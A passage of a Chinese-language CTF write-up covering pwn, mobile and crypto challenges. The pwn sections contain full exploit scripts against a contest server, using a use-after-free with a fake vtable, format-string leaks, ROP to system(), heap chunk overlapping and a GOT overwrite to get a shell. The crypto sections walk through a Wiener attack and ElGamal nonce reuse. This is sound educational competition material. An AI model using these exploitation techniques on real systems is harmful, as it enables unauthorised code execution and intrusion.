            dt_str_tab = 0x0
            while True:
                garbage = l64(leak(dyn_ent, 0x8))
                if garbage == 0x6:
                    dt_sym_tab = l64(leak(dyn_ent + 0x8, 0x8))
                elif garbage == 0x5:
                    dt_str_tab = l64(leak(dyn_ent + 0x8, 0x8))
                if dt_str_tab and dt_sym_tab:
                    break
                dyn_ent += 0x10
            print '[+] symtabtttt:t0x%x' % dt_sym_tab
            print '[+] strtabtttt:t0x%x' % dt_str_tab
            return (dt_sym_tab, dt_str_tab)
    def find_func_adr(dt_sym_tab, dt_str_tab, func, elf_base):
        if BITS == 64:
            sym_ent = dt_sym_tab
            while True:
                garbage = l32(leak(sym_ent, 0x4))
                name    = leak(dt_str_tab + garbage, len(func))
                if name == func:
                    break
                sym_ent += 0x18
            adr_func = l64(leak(sym_ent + 0x8, 0x8)) + elf_base
            print '[+] %s loaded addresst:t0x%x' % (func, adr_func)
            return adr_func
    # exploit ELF
    def lookup(func):
        elf_base                = find_elf_base()
        phdr                    = find_phdr(elf_base)
        dyn_section             = find_dyn_section(phdr, elf_base)
        dt_sym_tab, dt_str_tab  = find_sym_str_table(dyn_section)
        func_address            = find_func_adr(dt_sym_tab, dt_str_tab, func, elf_base)
        return func_address
    result = lookup('getshell')
    print '[+] function @ 0x%x' % result
    getshell(result)
    io.itr()

**Reference**

1\. <http://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html>

**  
**

**PWN400**

**Bugs**

1\. 在delete时没有对对象指针置零

2\. 加密后输入加密结果时存在泄漏，可泄漏出堆地址

**Thinking**

由于在delete后没有对对象指针置零，可导致一个uaf，通过uaf伪造一个对象的虚表指针和虚表，从而执行任意地址代码。另外，由于对象在调用虚函数时会传入一个参数，这个参数是对象本身的地址，因此第一个参数不能直接被我们控制，需要通过一段ROP来设置调用时的参数

大致的利用方式就是先通过UAF调用printf来泄露libc基地址，然后再通过system来getshell

通过一个

**Exploit**

    
    
    from zio import *
    target = ('119.28.62.216', 10023)
    io  = zio((target), print_read = COLORED(REPR, 'red'), print_write = COLORED(REPR, 'blue'), timeout = 10000)
    io.hint([0x401fba, 0x401fe3, 0x400d40])
    # adr
    plt_printf  = 0x0000000000400be0
    p8_ret      = 0x00402336
    pop_rdi_ret = 0x00402343
    entry       = 0x400d40
    # new key
    def leak():
        io.wls([1, 1, 11, 13])
        # io.wls([2, 0x40, (('AAAAAAAA' +'%{}$lxx00'.format(0x8b)).ljust(0x18, 'a') + l64(p8_ret)).ljust(0x40, 'a')])
        io.wls([2, 0x40, (('AAAAAAAA' +'0x%{}$lxx00'.format(71)).ljust(0x18, 'a') + l64(p8_ret)).ljust(0x40, 'a')])
        io.rtl('ciphertext: ')
        io.r(0x40 * 8)
        heap_base = l64(io.rl()[:-1].ljust(0x8, 'x00')) - 0x270
        print '[+] heap base: 0x%x' % heap_base
        # free
        io.wls([3, 0x10, '41' * 0x10])
        # malloc
        io.wls([4, l64(heap_base + 0x20)])
        # rop chain in stack (uaf)
        io.wls([2, 0x20, (l64(pop_rdi_ret) + l64(heap_base + 0x20) + l64(plt_printf) + l64(entry)).ljust(0x20, 'A')])
        for i in xrange(4): io.rtl('0x')
        adr_libc_start_main_ret = int(io.rtl('R')[:-1], 16)
        off_libc_start_main_ret = 0x21ec5
        libc_base   = adr_libc_start_main_ret - off_libc_start_main_ret
        off_system  = 0x00000000000468f0
        adr_system  = libc_base + off_system
        print '[+] libc base : 0x%x' % libc_base
        print '[+] system : 0x%x' % adr_system
        return adr_system
    def exp(adr_system):
        # io.wls([2, 0x40, (('AAAAAAAA' +'%{}$lxx00'.format(0x8b)).ljust(0x18, 'a') + l64(p8_ret)).ljust(0x40, 'a')])
        io.wls([1, 1, 11, 13])
        io.wls([2, 0x40, (('AAAAAAAA' +'/bin/shx00').ljust(0x18, 'a') + l64(p8_ret)).ljust(0x40, 'a')])
        io.rtl('ciphertext: ')
        io.r(0x40 * 8)
        heap_base = l64(io.rl()[:-1].ljust(0x8, 'x00')) - 0x270 + 0x450
        print '[+] heap base: 0x%x' % heap_base
        io.wls([3, 0x10, '41' * 0x10])
        for i in xrange(0x4): io.wls([4, l64(heap_base + 0x20)])
        # rop chain in stack
        io.wls([2, 0x20, (l64(pop_rdi_ret) + l64(heap_base + 0x20) + l64(adr_system) + l64(entry)).ljust(0x20, 'A')])
    exp(leak())
    io.itr()

**  
**

**PWN500**

**Bugs**

1\. 在读取字符串时存在一个null的溢出，在读取package的内容时可溢出到下一个堆块

2\. 一些编程的逻辑漏洞，在save package时没有对package_head置零

**Thinking**

程序开始时会malloc(0x20)用来存储sender，receiver，package链表的头结点地址

malloc(0x98)存储sender的内容

malloc(0xb8)存储receiver的内容

malloc(len+0x18)存储package内容

我采用的利用技巧是shrink free
chunks，这个方法在<http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf>中有介绍，最终的目标就是构造出overlapping
chunks，这样，通过修改package的内容，来达到修改receiver的链表next和prev指针的目的

之后就可以达到泄露heap和libc的目的，最后覆盖got表来get shell

**PoC of "shrinking free chunks"**

    
    
    char *a, *b, *c, *d, *e, *f;
    a = malloc(0x208);
    b = malloc(0x208);
    c = malloc(0x208);
    free(b);
    a[0x208] = 0x0;
    d = malloc(0x80);
    e = malloc(0x80);
    free(d);
    free(c);
    f = malloc(0x208); // f and e are overlapping chunks
    ```
    #### Exploit
    ```python
    from zio import *
    io = zio(('119.28.62.216', 10024), print_read = COLORED(RAW, 'red'), print_write = COLORED(RAW, 'blue'), timeout = 100000)
    io.hint([0x400e16])
    adr_control = 0x6030b8
    io.wl_af('?', 'y')
    io.wls_af(':', [1, '/bin/sh', 'BBBB'])
    io.wl_af(':', 2)
    io.wls_af(':', [1, 'AAAA', 'BBBB', 'CCCC', 'DDDD'])
    io.wls_af(':', [2, 0x1f0, 'aaaa'])
    io.wls_af(':', [2, 0x1f0, 'aaaa'])
    io.wls_af(':', [2, 0x1f0, 'dddd'])
    io.wls_af(':', [3, 2])
    io.wls_af(':', [3, 1])
    io.wls_af(':', [2, 0x1f0, 'b' * 0x1f0])     # shrink free chunk
    io.wl_af(':', 5)
    io.wl_af(':', 2)
    io.wls_af(':', [1, 'AAAA', 'BBBB', 'CCCC', 'DDDD'])
    io.wl_af(':', 5)
    io.wl_af(':', 2)
    io.wls_af(':', [1, 'AAAA', 'BBBB', 'CCCC', 'DDDD'])
    io.wl_af(':', 5)
    # overlap
    io.wls_af(':', [4, 2])
    io.wls_af(':', [4, 1])
    io.wl_af(':', 2)
    io.wls_af(':', [1, 'AAAA', 'AAAA', 'AAAA', 'AAAA'])
    io.wls_af(':', [3, 1])
    io.wls_af(':', [2, 0x1f0, 'b' * 0x98 + l64(0x0) + l64(0x81) + l64(adr_control - 0x20)])
    io.wl_af(':', 5)
    io.wl_af(':', 5)
    io.rtl('======receiver[2]=======')
    io.rtl('postcodes:')
    heap_base = l64(io.rl()[0:-1].ljust(0x8, 'x00')) - 0x10
    print '[+] heap baset:0x%x' % heap_base
    io.wl_af(':', 2)
    io.wls_af(':', [1, 'AAAA', 'AAAA', 'AAAA', 'AAAA'])
    io.wls_af(':', [3, 0])
    io.wls_af(':', [2, 0x1f0, 'd' * 0x98 + l64(0x0) + l64(0x81) + l64(0x603000 - 0x18)])
    io.wl_af(':', 5)
    io.wl_af(':', 5)
    io.rtl('======receiver[3]=======')
    io.rtl('contact:')
    adr_free    = l64(io.r(6).ljust(0x8, 'x00'))
    off_free    = 0x0000000000083c30
    off_read    = 0x00000000000ec690
    off_puts    = 0x0000000000070c70
    off_malloc  = 0x0000000000083590
    libc_base   = adr_free - off_free
    off_system  = 0x00000000000468f0
    adr_system  = off_system + libc_base
    adr_puts    = off_puts + libc_base
    adr_read    = off_read + libc_base
    adr_malloc  = off_malloc + libc_base
    print '[+] free addresst:0x%x' % adr_free
    print '[+] system addresst:0x%x' % adr_system
    io.wl_af(':', 2)
    io.wls_af(':', [1, 'AAAA', 'AAAA', 'AAAA', 'AAAA'])
    io.wls_af(':', [3, 0])
    io.wls_af(':', [2, 0x1f0, 'd' * 0x98 + l64(0x0) + l64(0x81) + l64(heap_base)])
    io.wl_af(':', 5)
    io.wls_af(':', [3, 4]),
    io.w(l64(0x603008) + l64(heap_base + 0x40)[0:7] + 'n' + 'B' * 0x8 + 'C' * 0x38)
    io.wls_af(':', [3, 0])
    io.w(l64(adr_system)[0:7] + 'n' + l64(adr_puts)[0:7] + 'n' + l64(adr_read)[0:7] + 'n' + l64(adr_malloc) + 'D' * 0x20 + l64(adr_system)[0:7] + 'n')
    io.wl('sh')
    io.wl('6')
    io.itr()

**  
**

**Misc**

**moblie 100**

这一题的确是个福利题…并没有涉及到dex函数隐藏等小技巧，只是简单的使用proguard进行了混淆。可以静态也可动态（动态先改掉debug检测，还不如直接静态看一下），那么，关键部分源码：

    
    
    private void getKey(){
        try {
            InputStream stream = this.getResources().getAssets().open("url.png");
            int v = stream.available();
            byte[] bs = new byte[v];
            stream.read(bs, 0, v);
            byte[] keybyte = new byte[16];
            System.arraycopy(bs, 144, keybyte, 0, 16);
            this.key = new String(keybyte, "utf-8");
        }
        catch (Exception e){
            e.printStackTrace();
        }
        //code
    }
    private String handle(String naive){
        try {
            naive.getBytes("utf-8");
            StringBuilder str = new StringBuilder();
            for (int i = 0; i < naive.length(); i += 2) {
                str.append(naive.charAt(i + 1));
                str.append(naive.charAt(i));
            }
            return str.toString();
        }catch (UnsupportedEncodingException e){
            e.printStackTrace();
        }
        return null;
    }        
    protected void Encryption(byte[] key){
        try {
            if (key == null) {
                byte[] bytes = "".getBytes("utf-8");
                MessageDigest messageDigest = MessageDigest.getInstance("MD5");
                byte[] bytes1 = messageDigest.digest(bytes);
                secretKeySpec = new SecretKeySpec(bytes1, "AES");
                cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            }
            else {
                secretKeySpec = new SecretKeySpec(key, "AES");
                cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            }
        }except{
            //...
        }
    }

从url.png中获得key，然后使用handle函数进行处理（奇偶位互换）作为最终AES加密的key。flag密文:

    
    
    byte[] bye = {21,-93,-68,-94,86,117,-19,-68,-92,33,50,118,16,13,1,-15,-13,3,4,103,-18,81,30,68,54,-93,44,-23,93,98,5,59};
    new String(bye);

使用AES/ECB/PKCS5Padding，用key对选手输入进行加密，结果与flag密文进行比对；故解密时只需

init(Cipher.DECRYPT_MODE, secretKeySpec)；

对flag密文进行解密即可。

flag:LCTF{1t's_rea1ly_an_ea3y_ap4}

**  
**

**moblie 200**

首先还是直接放出NDK部分源码…

    
    
    std::string secret = "dHR0dGlldmFodG5vZGllc3VhY2VibGxlaHNhdG5hd2k.";
    static const std::string chars =
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                    "abcdefghijklmnopqrstuvwxyz"
                    "0123456789+/";
    static inline bool is_base(unsigned char c) {
        return (isalnum(c) || (c == '+') || (c == '/'));
    }
    std::string encrypt(char const* bytes_to_encode, unsigned int in_len) {
        std::string ret;
        int i = 0;
        int j = 0;
        unsigned char char_array_3[3];
        unsigned char char_array_4[4];
        while (in_len--) {
            char_array_3[i++] = *(bytes_to_encode++);
            if (i == 3) {
                char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
                char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
                char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
                char_array_4[3] = char_array_3[2] & 0x3f;
                for(i = 0; (i <4) ; i++)
                    ret += chars[char_array_4[i]];
                i = 0;
            }
        }
        if (i)
        {
            for(j = i; j < 3; j++)
                char_array_3[j] = '';
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            for (j = 0; (j < i + 1); j++)
                ret += chars[char_array_4[j]];
            while((i++ < 3))
                ret += '.';
        }
        return ret;
    }
    static const char *handlePasswd(char* yourinput){
        char* input;
        std::string output = "";
        input = yourinput;
        if (NULL == input) {
            return NULL;
        }
        int low = 0;
        size_t hight = strlen(input) - 1;
        while (low < hight) {
            char tmp = input[low];
            input[low] = input[hight];
            input[hight] = tmp;
            ++low;
            --hight;
        }
        output.append(input);
        return encrypt(output.c_str(), (unsigned int) output.length()).c_str();
    }
    extern "C"
    jboolean
    Java_com_example_ring_wantashell_Check_checkPasswd(JNIEnv* env, jobject jobject1, jstring input){
        const char* pass;
        jboolean iscopy;
        const char* password;
        pass = env->GetStringUTFChars(input, false);
        if (pass == NULL ){
            return (jboolean)false;
        }
        char* pas = new char[33];
        strcpy(pas, pass);
        password = handlePasswd(pas);
        env->ReleaseStringUTFChars(input, pass);
        return (jboolean) (password == secret);
    }

本题主要是静态反汇编分析能力。EditText获取选手输入后，将其substring(5,
37)得到flag，亦为即将传入native方法的值，虽然没有检测其前5及后边的字符值，但对输入长度做了限定；native
checkPasswd(String
input)方法则分为两部分，一是对input做简单处理，即倒序；二则是一个base64编码，只是我把'='用'.'来替换了；input编码后直接与密文secret进行比对，所以程序内部并没有解密方法。

Jni_OnLoad函数内部则是简单的ptrace反调试和反模拟器的一些函数以及一个对dex的SMC，即将内存中的form函数的字节码用f0rm函数的来替换（其余两个是我后来觉得只有form和f0rm的话太过直接，于是添加进去的无用函数）。这种对dex字节码的SMC是一种Android低版本的方法（version
< 5），所以高系统版本手机上会crash掉…但由于只使用了AVD的模拟器及一款三星Android
4.4.4手机做测试，没有对其他机型做适配，所以有选手反应说在nexus5
4.4.3上也出了问题…虽然尽量使用了能够静态分析出的SMC方案，但仍在此表示诚挚的歉意…（请务必不要寄刀片…）

分析出encrypt是base64的话就很简单，只需将secret的'.'换为'='，然后base64.b64decode(secret)即可得到倒序的flag，为：iwantashellbecauseidonthaveitttt

**  
**

**crypt 200**

**写在前面……**

这道题本计划让参赛选手自己写脚本爆破的，然而ZZ出题人不小心把密文给的长了……于是几乎所有队伍都是在线解出来的……几乎成了签到题……出题人表示很悲伤……

**出题人计划中的解题思路：**

首先通过自己写脚本/在线工具，查出密钥很可能为两段，分别是 7、13
。然后开始爆破短密码，每爆破一位检查一次是否正确。这里有一个小点：对7位密钥爆破时，只需把第一位预设为'a'，爆破后六位就可以。用python多线程实现，大概需要3-4小时即可得出结果，Ｃ语言会更快。

怨念の出题人：只取密文中的前91个字母，你给我在线解啊在线解啊(〒︿〒)

**crypt 450**

拿到流量包，只有三个http请求：

主页

网站图标(favicon.ico)

下载了一个加密的zip文件(Somethingneeded.zip)

压缩包有密码，爆破不出来也没有提示；主页上就一个下载压缩包的链接，和一个网站图标的请求，然后看favicon.ico。一个简单的隐写，改了文件高度=
=没有想到这里会卡主一部分人，估计解压出来压缩包的都卡在密码上，没解压开压缩包的，基本都卡在这个隐写上面了。

用010editor打开图片，并载入png模板。找到文件的宽高字段，修改高度为一个略大的值，比如400，重新计算CRC并用新得到的CRC值替换原来字段的CRC值保存文件，打开就会得到zip加密的key。

修改前：

修改后：

用得到的key解压压缩包会得到三个文件。

1\. 发现RSA公钥中存在低解密指数攻击（加密指数过长）：通过Wiener Attack 攻击公钥n, e ，得到RSA私钥。恢复出RSA明文：

    
    
    AES_key:>>JfffOaqYHvuSIkfU
    First sign: ElGamal; First HASH: SHA[in python:>>int(SHA.new(msg).digest().encode('hex'),16)]

2\. 使用1.中得到的AES的密钥解密文本，得到：

    
    
    ESIGN
    HASH: SHA
    Alice in Sun Sep 25 02:40:07 CST 2016
    in these Signatures, important things r different....but....they r one and the same. indeed.

通过1.中所给消息，知道本次信息传递中使用的是`elgamal`签名算法。发现几条对消息签名时使用了相同的随机指数（A值相同）。根据A,B,P,以及1.中给出的hash计算方法，解出`elgamal`的私钥。

3\.
通过2中的AES明文，知道本次信息传递中使用的是`ESIGN`签名算法。用AES解密后，发现明文是两篇演讲的片段。发现没有找到flag，回头检查3，通过计算签名s的长度，发现其长度为4094位。长度有些诡异，怀疑用来计算N的私钥有问题。通过以前的积累，或查询资料，发现本次`esign`中存在阈下信道。通过2中所给信息，猜测本次阈下信道中的额外私钥r与2中`elgamal`签名的私钥相同。对3中签名信息计算后，得到信息：

    
    
    flag:>>p1eas3_b00m_**__b0om_shak4l4ka_1am_****
    hash:>>b96648cc3f097c6faf581386b97d7e043521abe2369d1141d9a98d4897770ea7
    map(lambda x:x in string.letters[:26]+string.digits, flag)==[True for x in len(flag)]

通过得到的信息得知：flag的格式、flag的hash值、flag包含的字符。其中，根据散列值长度得知，hash算法应为SHA256。此处有两种解法：

1\. 猜测flag的值

2\. 爆破

爆破耗时：in python 7966.50890207s

解密过程脚本：

    
    
    from Crypto.Cipher import AES
    from Crypto.Util.number import inverse
    from Crypto.Hash import SHA
    #rsa wiener attack
    #rsa
    d=945479
    n=97138137104734298609834482366162026304298592110475985436506028537069205049518477940234295052306979545838532836621897425238678644632407147169000035071022811912986002484126251044062768165713546731476185662130377342101286612617162668138061510373486561911394707269228925814230274314210636439524014517539501333347
    RSA_cipher=[88338041376938401802720557408228704277670863496574655328421532326725843272097398245807134173312579420393982660449469103160527683780725884286927820971842125127589841694210130213315926335981438201260031871966789654511469636565529079969394168628995175878129596748889594295059700929788081323076914856088444245112L, 61799587191566341619854870153945004198553938077225303160352458773817261402958372192378106795721702756191976223720864957706672008373655798626158938618656502841851649551320659253777035402269371424057142314225517057707462842393420846653734853164705499492891578783074253284026413294114604336927568599227641318014L]
    for x in RSA_cipher:
        print hex(pow(x,d,n))[2:-1].decode('hex')
    #aes
    AES_key='JfffOaqYHvuSIkfU'
    aes_cipher=['ciY5/kGjPdhAKVrnhNdWnrPLTRxgYyBS7qMYrz2Ak0o=n', 'qogojMDs8nk9+xjtzaJ2as9heZ1hO4tU+lkWy5p6an0=n', 'KFcU6TOSA9pa1rhK7z4MbB2973DWjefjdtLpAL3e7j2kyKh958JjDgs4gP+z14Fu7C6u40ol/t2dnm5MVgeY93g==n', 'EmS6a94W5adYv6t4lClWso8eBEc43Bv6UDf2di1eaS40jPfkKhplW2xZqhftGQSQxbXPRo7pkI7enItzc0WCy0P8TT49/UPAMF5b60gDZMPt2j/ZRAuHxaJzF8Cx2it7gKs24ncfTd4SOWe2u7MKOKw==n']
    for x in aes_cipher:
        aes=AES.new(AES_key, AES.MODE_CBC,x[:16])
        print aes.decrypt(x.decode('base64'))[16:]
    #elgamal
    y=15148966177463904691976929838930853269289042839863729153722159418042428750060107430271482040640819799571694807206565563732947531693110647584022938487969095426383780089637260478432928271983711941845660111527182345478689092328947780732610986992284917052181103606943301549620374333055713772173803160039045677747L
    g=25986687973107588697969881578531976225371183716036966607566598597020466205189059529253570979189706405467377222766170735056450913652725357600357578278196605120029525929914741729624555676312392184452733004866834101377570297318905377030568966047530761331315780489316379915546238079764422405334804304898426687980L
    p=137967888557999584952319237542893026336748210577336880254687758603509585370528901731055615450121641462482424970657347865301939510121259558782471038671268295347199943208985837721430708786848240150088389965993410045395623590020110797728504435013202372429725107610844546670040670171936933047396461805698152157887L
    a=39370371870759685744880219013861529359618555030410863001040308371947410012054549207612071728536023322186748226046661353393772853562380526414095218658206970877514669689306990840319762479981191161383790605961521206224285819589569439347118291570125764824252249717974718794796429000637269474821559491639876277622L
    b_1=134684485624161722987021635696340906125874242700255840489978717909572949629047583933623167185071756551222666372564819181853883708840908663577036374636521884329720103037550136452569114301719473556970058712470208671611709476886062032130414621155592035982216482184069779157329196503823026688539159075884112435996L
    b_2=105396166206430883198614275890827062056159012286110042575572024146834036632816276753821090982097827834427186711544957971715438182849629129341938574550891409300133967462947765862253827035010131907704291025456105903654968880992395975177059676410502095248239091847873470990731624808614783122403783791697356313395L
    m1='ESIGN'
    m2='in these Signatures, important things r different....but....they r one and the same. indeed.'
    h1= int(SHA.new(m1).digest().encode('hex'),16)
    h2= int(SHA.new(m2).digest().encode('hex'),16)
    k = (h1-h2)*inverse((b_1 - b_2), (p-1)) %(p-1)
    ##secret key in elgamal
    x = ((h1 - k*b_1)*inverse(a, (p-1))%(p-1))/2##--------------->or :  x ==((h1 - k*b_1)*inverse(a, (p-1))%(p-1)) + (p-1)   
    print 'elgamal secrect key:>>'+str(x)
    tmp=''
    aes_cipher=['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n', 'lZ47Cr0QmoBxPm4KyDgrOLuXNgK3TFGrcrlx/kNb5IP80lQib5TJOv++5zPsYpioT78jabZNhtYCnWA0p851yHNQso+p2KTvy8RPbhqPkgVNPIuqYV+kX0yAypKHeaX2cdfci6wSLNbkq4t1eVnyHq1bfnjxLcKfG7WpKNUEnc7O22gMIZY9dR9Ctg6o0gSaHrn', 'sei1bcxEOGSD6sfFXg1HLTIOiUD0IBcnsz+MYoNiQZ31trOWtx61usgc1CcExQv6aublc+xposjsn1W4wZRJYQ0JNPeEMPJfEW5ISAGqW39fbu3QRWi0OCPKYYQEEG9DsTJU4IoFqN3rwhuAF7CCKPIuvnfEXi/5pUyrJcmLckD4rIUBfDacgeLfMJzXDQn5h0Oe9C/lf6EMQj9nDthjzXKLNamsE9wxS1YXqJnk5RpHHmLH1ZfRzfgN8tGyEbcLHjgOv4DIXVLXHHQEfFMAf/IEffm3adPyXoal0EubvYdES9JHSB/n0nh6sWt1jDXFNfY6wI7fD+MBhLqcaM66c/E+8Jyn0p160bl7xxwJRxf5QFocMJW6q7HDKQS1foSanFM7dxHaVeopFX0Mf2p0bxEUWM0BLI5aKWMgojt5nBWWj3ke3HhTjZE0R+1FmWeQ0z3fnVkWt/qrbnP8mQFNHenhF9Liu31kNET8a36Rp7dl/Ub1JTYFvmraVmlWUr94p+/aR5kQm+DjoYbZm6mXHQaeomni28wwClcooOTY4sV42/d4iYYgLi41qbha3uUi01hw3FLOUiM52uQUchgbtllda1dT8Hu6j6+xB9Fn8DfHp902uR9jt3CifRBmdT9WzD77nYNDuot8iUtok8kB+b2l9QllHDpG2oJ5DADn/0tOurE7Ztrfny/0C2mCqT/J6k+rdni/Rmx5PpD3DCSQ5k3ebForUMEyAIZqM1vaSk+Inj5tfP2j/iFq5aOmkXgrenX+4Cubmopk0PHc2b+0w74dPGFw9pIdJoI6ovjBiULusgsXEXql64MHI/tGZ3YuXD6qgJTplOW51AnhN4EaYhzmboPhZe5i2aYR02houlwEQxMtLRNGDgG58ndlnNYnrxRiUm5E8JVj3aSPqpJ4s+SimWYnocJSEj1uEtsCvrnCXYUHweibZ2jlhqUTzhG9V+8hVxgBFJGS46XBZ6dBaWsdJkS7OWdGNCOJsSGTnV1xEZSLIwJQlLz06qWUnqz51eaVUKjYSfey1XR5J1f3gYNNiX3umKQ0G+GCU2tvrJziX2EO0LKJ9nLPqyhlR0jrE0XgjGKZUZGLcbAdYbvZAIMGhGh2EyUPJUe68vMB8mCUzukI5iAMAUtSKMpoTdPYBHnBvv7XVRFvFJy6n3oYjLwglaAgnde0LPnUqelmw76d3iuSIz7H3BhxUZmtarTRh/KXC5Ye/bgpqo7nh6ZlEEps3iQSiXdfSSPERwy5V2ovM96NHsqJo+nUCK/CkvQxsLF8TlaO2mIc/lq9MKa0eNIGScMpn6yg2LArh6rG5qIdBvj0wr+Yw0q81vicFUKw5r43NxxCtP5YRAyuNteviJEYZchb12K2LQbA63V1dnXai75RG29+DzdXl+jLzZl8el+iWzMFBe+nkZGQc2HQlNERubmM4nvu3r/L8t+9PhnY5wPbTGKComn30ef1oQF+fTyWcRHSrtQRAbF/4hcqWt63mHajVjpz4nbfsLu68eFILUH6C7852vlGAilWN4=n', 